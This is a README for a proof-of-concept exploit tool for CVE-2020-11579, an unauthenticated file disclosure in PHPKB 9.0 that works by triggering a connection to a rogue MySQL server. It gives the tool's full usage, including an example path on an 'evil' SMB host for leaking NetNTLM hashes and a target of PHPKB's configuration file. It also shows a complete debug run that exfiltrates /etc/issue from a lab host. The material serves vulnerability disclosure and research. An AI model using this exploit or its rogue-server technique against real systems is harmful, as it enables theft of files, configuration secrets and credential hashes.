# CVE-2020-11579

## Introduction
[PHPKB 9.0 Enterprise Edition (MySQL database)](https://www.knowledgebase-script.com/) is affected by an unauthenticated arbitrary file disclosure via a malicious MySQL Server. 

A remote attacker can read any file on a remote victim host with web-server privileges (e.g. `www-data`), via a single HTTP GET request.

Read more at https://shielder.it/blog/mysql-and-cve-2020-11579-exploitation

## Note
The script can also be run in `server-only mode` and it provides a standalone MySQL Server to use for similar vulnerabilities.

## Usage
```
usage: CVE-2020-11579.py [-h] [-rh RHOST] -lh LHOST [-lp LPORT] [-f FILE]
                         [-c {mysql_cli,mysqlnd}] [-s] [-d] [-o OUTPUT_FILE]

optional arguments:
  -h, --help            show this help message and exit
  -rh RHOST, --rhost RHOST
                        remote PHPKB webroot, e.g.:
                        http://10.10.10.11:8080/phpkbv9
  -lh LHOST, --lhost LHOST
                        local host ip/hostname to expose the rogue mysql
                        server at
  -lp LPORT, --lport LPORT
                        local port to expose the rogue mysql server at
  -f FILE, --file FILE  remote file to exfiltrate, e.g.
                        `\\evil.smb.server.ip\netntlm\leak.jpg` or PHPKB's `../../admin/include/configuration.php`
  -c {mysql_cli,mysqlnd}, --configuration {mysql_cli,mysqlnd}
  -s, --server-only     start rogue mysql server and wait
  -d, --debug           enable debug mode
  -o OUTPUT_FILE, --output-file OUTPUT_FILE
                        save exfiltrated file to path
```

## Example run

### Gif version
![Example run gif](example.gif)

### Textual version
```
$ ./CVE-2020-11579.py -rh http://192.168.252.130 -lh 0.0.0.0 -f '/etc/issue' -lp 3308 -d
2020-03-17 06:22:22,796 - INFO - triggering mysql connection...
2020-03-17 06:22:23,804 - INFO - new connection from: 192.168.252.130:55628:
2020-03-17 06:22:23,804 - DEBUG - server -> client: (Server Greeting)
0000 50 00 00 00 0a 35 2e 31 2e 36 36 2d 30 2b 73 71 P....5.1.66-0+sq
0010 75 65 65 7a 65 31 00 36 00 00 00 31 32 33 34 35 ueeze1.6...12345
0020 36 37 38 00 df f7 08 02 00 00 00 15 00 00 00 00 678.............
0030 00 00 00 00 00 00 77 68 61 74 65 76 65 72 00 6d ......whatever.m
0040 79 73 71 6c 5f 6e 61 74 69 76 65 5f 70 61 73 73 ysql_native_pass
0050 77 6f 72 64                                     word
2020-03-17 06:22:23,805 - DEBUG - client -> server: (len)
0000 55 00 00                                        U..
2020-03-17 06:22:23,805 - DEBUG - client -> server: (data)
0000 01 8d a2 0a 00 00 00 00 c0 08 00 00 00 00 00 00 ................
0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0020 00 74 65 73 74 00 14 fe 23 45 40 fd 5b 09 3e c8 .test...#E@.[.>.
0030 37 69 3b b0 c8 f8 9b fb 44 a0 0f 74 65 73 74 00 7i;.....D..test.
0040 6d 79 73 71 6c 5f 6e 61 74 69 76 65 5f 70 61 73 mysql_native_pas
0050 73 77 6f 72 64 00                               sword.
2020-03-17 06:22:23,805 - INFO - received login info and client capabilities ^
2020-03-17 06:22:23,805 - INFO - client has LOAD DATA LOCAL bit set (good)
2020-03-17 06:22:23,805 - DEBUG - server -> client: (Response OK)
0000 07 00 00 02 00 00 00 02 00 00 00                ...........
2020-03-17 06:22:23,805 - INFO - fake authentication finished
2020-03-17 06:22:23,806 - DEBUG - client -> server: (len)
0000 0f 00 00                                        ...
2020-03-17 06:22:23,806 - DEBUG - client -> server: (data)
0000 00 03 53 45 54 20 4e 41 4d 45 53 20 75 74 66 38 ..SET NAMES utf8
2020-03-17 06:22:23,806 - INFO - received Request Query (this is going to be ignored) ^
2020-03-17 06:22:23,806 - DEBUG - server -> client: (file request / response TABULAR)
0000 0b 00 00 01 fb 2f 65 74 63 2f 69 73 73 75 65    ...../etc/issue
2020-03-17 06:22:23,806 - DEBUG - client -> server: (len)
0000 1a 00 00                                        ...
2020-03-17 06:22:23,806 - DEBUG - client -> server: (data)
0000 02 55 62 75 6e 74 75 20 31 36 2e 30 34 2e 36 20 .Ubuntu 16.04.6
0010 4c 54 53 20 5c 6e 20 5c 6c 0a 0a                LTS \n \l..
2020-03-17 06:22:23,806 - INFO - received file contents ^
2020-03-17 06:22:23,807 - DEBUG - client -> server: (len)
0000 00 00 00                                        ...
2020-03-17 06:22:23,807 - DEBUG - client -> server: (data)
0000 03                                              .
2020-03-17 06:22:23,807 - DEBUG - server -> client: (Response OK)
0000 07 00 00 04 00 00 00 02 00 00 00                ...........
2020-03-17 06:22:23,807 - INFO - file exfiltration finished
2020-03-17 06:22:23,807 - CRITICAL - Successfully extracted file from 192.168.252.130:55628:
Ubuntu 16.04.6 LTS \n \l


2020-03-17 06:22:23,807 - DEBUG - client -> server: (len)
0000 01 00 00                                        ...
2020-03-17 06:22:23,807 - DEBUG - client -> server: (data)
0000 00 01                                           ..
2020-03-17 06:22:23,807 - INFO - received request command quit ^
2020-03-17 06:22:23,807 - DEBUG - server -> client: (quitting)
0000 00                                              .
2020-03-17 06:22:23,809 - INFO - mySQL connection successfully triggered
2020-03-17 06:22:23,809 - INFO - stopping the server...
```

## Contribute
Have you found a client which is not currently supported but you made it somehow work? Send a pull-request with the new client configuration (search for `# add here any new client configuration` in CVE-2020-11579.py) and we will accept it! :smile:

## Credits 
* [polict](https://twitter.com/polict_) of Shielder for the vulnerability discovery and server improvements
* [Gifts](https://github.com/Gifts) for the original rogue MySQL server